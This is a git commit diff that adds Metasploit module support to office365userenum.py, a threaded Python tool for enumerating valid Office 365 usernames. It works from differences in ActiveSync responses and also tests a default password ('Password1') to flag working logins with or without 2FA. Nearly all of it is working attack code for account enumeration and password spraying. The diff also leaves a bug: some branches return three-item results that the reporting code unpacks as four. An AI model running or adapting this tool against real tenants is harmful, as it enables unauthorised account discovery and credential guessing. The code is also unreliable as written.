63854c9f20da1b1d110bb7439bd34678713eb278
GrimHacker <grimhacker@grimhacker.com>
2018-09-06 22:05:50 +0100

    Metasploit Compatibility
    Add the requirements for this python script to be run from MSF
    as an external module.
    This script still operates independently when MSF is not in use.

--- office365userenum.py
+++ office365userenum.py
@@ -1,4 +1,5 @@
 #! /usr/bin/env python
+# -*- coding: utf-8 -*-
 from __future__ import print_function
 
 '''
@@ -31,7 +32,7 @@ office365userenum - Office 365 Username Enumerator
     51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 '''
 
-__version__ = "$Revision: 2.0$"
+__version__ = "$Revision: 3.0$"
 # $Source$
 
 import argparse
@@ -39,16 +40,18 @@ import threading
 import logging
 import sys
 
-try:
-    import requests
-except ImportError as e:
-    print("Missing Dependency! python-requests required!")
-    exit()
-
 if sys.version_info <= (3, 0):
     import Queue as queue
 else:
     import queue
+
+dependencies_missing = False
+try:
+    import requests
+except ImportError as e:
+    print("Missing Dependency! python-requests required!")
+    dependencies_missing = True
+
 
 VALID_USER = "VALID_USER"
 INVALID_USER = "INVALID_USER"
@@ -58,66 +61,197 @@ UNKNOWN = "UNKNOWN"
 DIE = "!!!AVADA KEDAVRA!!!"
 SHUTDOWN_EVENT = threading.Event()
 
+default_password = "Password1"
+default_url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
+default_max_threads = 10
+default_timeout = 30
 
-def check_user(url, user, password):
-    headers = {}
-    headers["MS-ASProtocolVersion"] = "14.0"
+MSF = False
+try:
+    from metasploit import module
+    MSF = True
+
+    metadata = {
+        'name': 'Office 365 User Enumeration',
+        'description': '''
+            Enumerate valid usernames (email addresses) from Office 365 using ActiveSync.
+            Differences in the HTTP Response code and HTTP Headers can be used to differentiate between:
+             - Valid Username (Response code 401)
+             - Valid Username and Password without 2FA (Response Code 200)
+             - Valid Username and Password with 2FA (Response Code 403)
+             - Invalid Username (Response code 404 with Header X-CasErrorCode: UserNotFound)
+            Note this behaviour appears to be limited to Office365, MS Exchange does not appear to be affected.
+            Microsoft Security Response Center stated on 2017-06-28 that this issue does not "meet the bar for security
+            servicing". As such it is not expected to be fixed any time soon. 
+        ''',
+        'authors': [
+            'Oliver Morton (GrimHacker) <grimhacker@grimhacker.com>'
+        ],
+        'date': '2018-09-05',
+        'license': 'GPL_LICENSE',
+        'references': [
+            {'type': 'url', 'ref': 'https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/'},
+        ],
+        'type': 'single_scanner',
+        'options': {
+            'USERS': {
+                'type': 'string',
+                'description': 'Potential usernames file, one username per line',
+                'required': True,
+                'default': None
+            },
+            'OUTPUT': {
+                'type': 'string',
+                'description': 'Output file (will be appended to)',
+                'required': True,
+                'default': None
+            },
+            'PASSWORD': {
+                'type': 'string',
+                'description': 'Password to use during enumeration.',
+                'required': True,
+                'default': default_password
+            },
+            # TODO: MSF is adding RHOSTS automatically as a required option,
+            #  if i rename URL to RHOSTS or RHOST the module breaks...
+            'URL': {
+                'type': 'string',
+                'description': 'ActiveSync URL',
+                'required': True,
+                'default': default_url
+            },
+            'THREADS': {
+                'type': 'int',
+                'description': 'Maximum threads',
+                'required': True,
+                'default': default_max_threads
+            },
+            'TIMEOUT': {
+                'type': 'int',
+                'description': 'HTTP Timeout',
+                'required': True,
+                'default': default_timeout
+            },
+            'VERBOSE': {
+                'type': 'bool',
+                'description': 'Debug logging',
+                'required': True,
+                'default': False
+            },
+            'LOGFILE': {
+                'type': 'string',
+                'description': 'Log file',
+                'required': True,
+                'default': None
+            },
+            # TODO: RPORT needs to exist or reporting the valid/invalid creds causes an error...
+            'RPORT': {
+                'type': 'int',
+                'description': 'IGNORE ME!',
+                'required': False,
+                'default': 443
+            }
+        }
+    }
+
+except ImportError as e:
+    # Not running under metasploit
+    pass
+
+
+def check_user(url, user, password, timeout):
+    """Exploit the difference in HTTP responses from the ActiveSync service to identify valid and invalid usernames.
+    It was also identified that valid accounts with 2FA enabled can be distinguished from valid accounts without 2FA."""
+    headers = {"MS-ASProtocolVersion": "14.0"}
     auth = (user, password)
     try:
-        r = requests.options(url, headers=headers, auth=auth, timeout=TIMEOUT)
+        r = requests.options(url, headers=headers, auth=auth, timeout=timeout)
     except Exception as e:
-        logging.warning("error checking {} : {}".format(user, e))
+        msg = "error checking {} : {}".format(user, e)
+        if MSF:
+            module.log(msg, "error")
+        else:
+            logging.error(msg)
         return user, UNKNOWN, None
     status = r.status_code
     if status == 401:
-        return user, VALID_USER, r
+        return user, password, VALID_USER, r
     elif status == 404:
         if r.headers.get("X-CasErrorCode") == "UserNotFound":
-            return user, INVALID_USER, r
+            return user, password, INVALID_USER, r
     elif status == 403:
         return user, VALID_PASSWD_2FA, r
     elif status == 200:
-        return user, VALID_LOGIN, r
-    return user, UNKNOWN, r
+        return user, password, VALID_LOGIN, r
+    return user, password, UNKNOWN, r
 
 
-def check_users(in_q, out_q, url, password):
+def check_users(in_q, out_q, url, password, timeout):
+    """Thread worker function which retrieves candidate username from input queue runs the check_user function and
+    outputs the result to the output queue."""
     while not SHUTDOWN_EVENT.is_set():
         try:
             user = in_q.get()
         except queue.Empty as e:
-            logging.debug("check_users: in_q empty")
+            msg = "check_users: in_q empty"
+            if MSF:
+                module.log(msg, "debug")
+            else:
+                logging.debug(msg)
             continue
         if user == DIE:
             in_q.task_done()
-            logging.debug("check_users thread dying")
+            msg = "check_users thread dying"
+            if MSF:
+                module.log(msg, "debug")
+            else:
+                logging.debug(msg)
             break
         else:
-            logging.debug("checking: {}".format(user))
+            msg = "checking: {}".format(user)
+            if MSF:
+                module.log(msg, "debug")
+            else:
+                logging.debug(msg)
             try:
-                result = check_user(url, user, password)
+                result = check_user(url, user, password, timeout)
             except Exception as e:
-                logging.warning("Error checking {} : {}".format(user, e))
+                msg = "Error checking {} : {}".format(user, e)
+                if MSF:
+                    module.log(msg, "error")
+                else:
+                    logging.error(msg)
                 in_q.task_done()
                 continue
-            logging.debug(result)
+            msg = "{}".format(result)
+            if MSF:
+                module.log(msg, "debug")
+            else:
+                logging.debug(msg)
             out_q.put(result)
             in_q.task_done()
 
 
-def get_users(user_file, in_q):
+def get_users(user_file, in_q, max_threads):
+    """Thread worker function. Load candidate usernames from file into input queue."""
     with open(user_file, "r") as f:
         for line in f:
             if SHUTDOWN_EVENT.is_set():
                 break
             user = line.strip()
-            logging.debug("user = {}".format(user))
+            msg = "user = {}".format(user)
+            if MSF:
+                module.log(msg, "debug")
+            else:
+                logging.debug(msg)
             in_q.put(user)
-    for _ in range(MAX_THREADS):
+    for _ in range(max_threads):
         in_q.put(DIE)
 
 
 def report(out_q, output_file):
+    """Thread worker function. Output to terminal and file."""
+    msf_template = "{code} {valid} {user}:{password}"
     template = "[{s}] {code} {valid} {user}:{password}"
     symbols = {
         VALID_USER: "+",
@@ -132,28 +266,66 @@ def report(out_q, output_file):
             try:
                 result = out_q.get()
             except queue.Empty as e:
-                logging.debug("report: out_q empty")
+                msg = "report: out_q empty"
+                if MSF:
+                    module.log(msg, "debug")
+                else:
+                    logging.debug(msg)
                 continue
             if result == DIE:
                 out_q.task_done()
-                logging.debug("report thread dying.")
+                msg = "report thread dying."
+                if MSF:
+                    module.log(msg, "debug")
+                else:
+                    logging.debug(msg)
                 break 
             else:
-                user, valid, r = result
+                user, password, valid, r = result
                 if r is None:
                     code = "???"
                 else:
                     code = r.status_code
                 s = symbols.get(valid)
                 output = template.format(s=s, code=code, valid=valid, user=user, password=password)
-                logging.info(output)
+                if MSF:
+                    msf_output = msf_template.format(code=code, valid=valid, user=user, password=password)
+                    msf_reporters = {
+                        VALID_USER: module.report_wrong_password,
+                        VALID_PASSWD_2FA: module.report_correct_password,
+                        VALID_LOGIN: module.report_correct_password
+                    }
+                    module.log(msf_output, "debug")
+                    msf_reporter = msf_reporters.get(valid)
+                    if msf_reporter is not None:
+                        msf_reporter(user, password)
+                    if valid in [VALID_LOGIN, VALID_PASSWD_2FA, VALID_USER]:
+                        module.log(msf_output, "good")
+                    else:
+                        module.log(msf_output, "error")
+                else:
+                    logging.info(output)
                 f.write("{}\n".format(output))
                 out_q.task_done()
 
 
-def print_version():
-    """Print command line version banner."""
-    print("""
+def run(args):
+    """Metasploit callback.
+    Convert args to lowercase for internal compatibility."""
+    if dependencies_missing:
+        module.log("Module dependency (requests) is missing, cannot continue")
+        return
+    args['TIMEOUT'] = float(args['TIMEOUT'])
+    args['THREADS'] = int(args['THREADS'])
+    lower_args = {}
+    for arg in args:
+        lower_args[arg.lower()] = args[arg]
+    main(lower_args)
+
+
+def get_banner():
+    """Return version banner."""
+    return """
 
 .       .1111...          | Title: office365userenum.py
     .10000000000011.   .. | Author: Oliver Morton (Sec-1 Ltd)
@@ -170,7 +342,7 @@ grimhacker.com  ..        |
     This is free software, and you are welcome to redistribute it
     under certain conditions. See GPLv2 License.
 ----------------------------------------------------------------------------
-""".format(__version__))
+""".format(__version__)
 
 
 def setup_logging(verbose=True, log_file=None):
@@ -197,38 +369,18 @@ def setup_logging(verbose=True, log_file=None):
                             format="%(levelname)s: %(module)s: %(message)s")
 
 
-if __name__ == "__main__":
-    print_version()
-
-    default_password = "Password1"
-    default_url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
-    default_max_threads = 10
-    default_timeout = 30
-    
-    parser = argparse.ArgumentParser(description="Enumerate Usernames from Office365 ActiveSync")
-    parser.add_argument("-u", "--users", help="Potential usernames file, one username per line", required=True)
-    parser.add_argument("-o", "--output", help="Output file (will be appended to)", required=True)
-    parser.add_argument("--password", help="Password to use during enumeration. Default: {}".format(default_password), default=default_password)
-    parser.add_argument("--url", help="ActiveSync URL. Default: {}".format(default_url), default=default_url)
-    parser.add_argument("--threads", help="Maximum threads. Default: {}".format(default_max_threads), default=default_max_threads, type=int)
-    parser.add_argument("--timeout", help="HTTP Timeout. Default: {}".format(default_timeout), default=default_timeout, type=float)
-    parser.add_argument("-v", "--verbose", help="Debug logging", action="store_true")
-    parser.add_argument("--logfile", help="Log File", default=None)
-
-    args = parser.parse_args()
-
-    setup_logging(args.verbose, args.logfile)
-    
-    user_file = args.users
-    output_file = args.output
-    url = args.url
-    password = args.password
-    MAX_THREADS = args.threads
-    TIMEOUT = args.timeout
+def main(args):
+    """Setup worker threads and handle shutdown."""
+    user_file = args['users']
+    output_file = args['output']
+    url = args['url']
+    password = args['password']
+    max_threads = args['threads']
+    timeout = args['timeout']
 
     threads = []
     meta_threads = []
-    max_size = MAX_THREADS/2
+    max_size = max_threads / 2
     if max_size < 1:
         max_size = 1
     in_q = queue.Queue(maxsize=max_size)
@@ -239,15 +391,16 @@ if __name__ == "__main__":
         report_thread.start()
         meta_threads.append(report_thread)
 
-        file_thread = threading.Thread(name="Thread-inputfile", target=get_users, args=(user_file, in_q))
+        file_thread = threading.Thread(name="Thread-inputfile", target=get_users, args=(user_file, in_q, max_threads))
         file_thread.start()
         meta_threads.append(file_thread)
 
-        for num in range(MAX_THREADS):
-            t = threading.Thread(name="Thread-worker{}".format(num), target=check_users, args=(in_q, out_q, url, password))
+        for num in range(max_threads):
+            t = threading.Thread(name="Thread-worker{}".format(num), target=check_users,
+                                 args=(in_q, out_q, url, password, timeout))
             t.start()
             threads.append(t)
-       
+
         for thread in threads:
             while thread.is_alive():
                 thread.join(timeout=0.1)
@@ -255,9 +408,13 @@ if __name__ == "__main__":
         for thread in meta_threads:
             while thread.is_alive():
                 thread.join(timeout=0.1)
-    
+
     except KeyboardInterrupt as e:
-        logging.critical("Received KeyboardInterrupt - shutting down")
+        msg = "Received KeyboardInterrupt - shutting down"
+        if MSF:
+            module.log(msg, "critical")
+        else:
+            logging.critical(msg)
         SHUTDOWN_EVENT.set()
 
         for thread in threads:
@@ -267,3 +424,29 @@ if __name__ == "__main__":
         for thread in meta_threads:
             while thread.is_alive():
                 thread.join(timeout=0.1)
+
+
+if __name__ == "__main__":
+    if MSF:
+        module.log(get_banner(), "info")
+        module.run(metadata, run)
+    else:
+        print(get_banner())
+        parser = argparse.ArgumentParser(description="Enumerate Usernames (email addresses) from Office365 ActiveSync")
+        parser.add_argument("-u", "--users", help="Potential usernames file, one username per line", required=True)
+        parser.add_argument("-o", "--output", help="Output file (will be appended to)", required=True)
+        parser.add_argument("--password", default=default_password,
+                            help="Password to use during enumeration. Default: {}".format(default_password))
+        parser.add_argument("--url", help="ActiveSync URL. Default: {}".format(default_url), default=default_url)
+        parser.add_argument("--threads", help="Maximum threads. Default: {}".format(default_max_threads),
+                            default=default_max_threads, type=int)
+        parser.add_argument("--timeout", help="HTTP Timeout. Default: {}".format(default_timeout),
+                            default=default_timeout, type=float)
+        parser.add_argument("-v", "--verbose", help="Debug logging", action="store_true")
+        parser.add_argument("--logfile", help="Log File", default=None)
+
+        args = parser.parse_args()
+
+        setup_logging(args.verbose, args.logfile)
+
+        main(vars(args))
